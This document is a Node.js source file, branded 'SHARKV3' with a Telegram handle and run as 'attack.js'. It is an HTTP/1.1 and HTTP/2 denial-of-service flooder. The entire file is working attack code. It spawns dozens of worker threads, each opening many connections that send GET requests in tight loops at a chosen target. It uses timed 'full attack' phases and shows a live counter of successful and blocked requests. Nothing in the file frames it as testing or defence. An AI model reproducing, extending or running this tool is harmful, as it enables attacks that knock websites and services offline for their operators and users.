const http2 = require('http2');
const http = require('http');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { cpus } = require('os');
const readline = require('readline');
const net = require('net');

const THREADS = 16;
const INITIAL_CONNECTIONS = 20;
const POWER_MULTIPLIER = 2;
const WARMUP_TIME = 20000; // 20 seconds warmup
const MAX_INFLIGHT = 2000;
const MAX_RPS = 10000; // Adjust this depending on your needs

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;

if (isMainThread) {
    if (process.argv.length < 5) {
        console.error('Usage: node attack.js <target> <duration_secs> <protocol (h1/h2)>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);
    const protocol = process.argv[4].toLowerCase();

    if (protocol !== 'h1' && protocol !== 'h2') {
        console.error('Invalid protocol. Use "h1" or "h2".');
        process.exit(1);
    }

    console.clear();
    console.log(`Warming up... Starting attack in 5s`);

    setTimeout(() => {
        console.clear();
        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);

        // Initial 5 seconds to start threads
        for (let i = 0; i < THREADS; i++) {
            new Worker(__filename, { workerData: { target, duration, protocol, initial: true } });
        }

        // After 5s start full attack for 10s, then 10-20s rest phase
        setTimeout(() => {
            for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
                new Worker(__filename, { workerData: { target, duration, protocol, initial: false } });
            }
        }, 5000);

        // Rest period after the full throttle (10s to 20s phase)
        setTimeout(() => {
            for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
                new Worker(__filename, { workerData: { target, duration, protocol, initial: true } });
            }
        }, 15000);

        // Live stats
        setInterval(() => {
            maxRps = Math.max(maxRps, rpsLastSecond);
            renderStats();
            rpsLastSecond = 0;
        }, 1000);
    }, 5000);

    function renderStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);
        console.log(`total: ${totalRequests}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`===========================`);
        console.log(`succes: ${successCount}`);
        console.log(`Blocked: ${errorCount}`);
    }

    const server = net.createServer(socket => {
        socket.on('data', data => {
            const msg = data.toString();
            if (msg === 'req') {
                totalRequests++;
                rpsLastSecond++;
            } else if (msg === 'ok') {
                successCount++;
            } else if (msg === 'err') {
                errorCount++;
            }
        });
    });
    server.listen(9999);
} else {
    const { target, duration, protocol, initial } = workerData;
    const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
    const end = Date.now() + duration * 1000;

    const socket = net.connect(9999, '127.0.0.1');
    const sendStat = msg => socket.write(msg);

    function sendOne(client, inflight) {
        if (Date.now() > end) return;

        if (inflight.count >= MAX_INFLIGHT) {
            return setTimeout(() => sendOne(client, inflight), 1);
        }

        try {
            inflight.count++;
            let req;
            if (protocol === 'h2') {
                req = client.request({ ':path': '/', ':method': 'GET' });
                req.setNoDelay?.(true);
            } else {
                req = http.request(target, { method: 'GET' });
            }
            req.on('response', () => {
                sendStat('ok');
                inflight.count--;
            });
            req.on('error', () => {
                sendStat('err');
                inflight.count--;
            });
            req.end();
            sendStat('req');
        } catch {
            inflight.count--;
            sendStat('err');
        }

        setImmediate(() => sendOne(client, inflight));
    }

    function createConnection() {
        let client;
        try {
            if (protocol === 'h2') {
                client = http2.connect(target);
            } else {
                client = http.request(target);
            }

            client.on('error', () => {});
            client.on('close', () => setTimeout(createConnection, 100));
            client.on('connect', () => {
                const inflight = { count: 0 };
                for (let i = 0; i < 100; i++) sendOne(client, inflight);
            });
        } catch {
            setTimeout(createConnection, 250);
        }
    }

    for (let i = 0; i < connections; i++) {
        createConnection();
    }
}
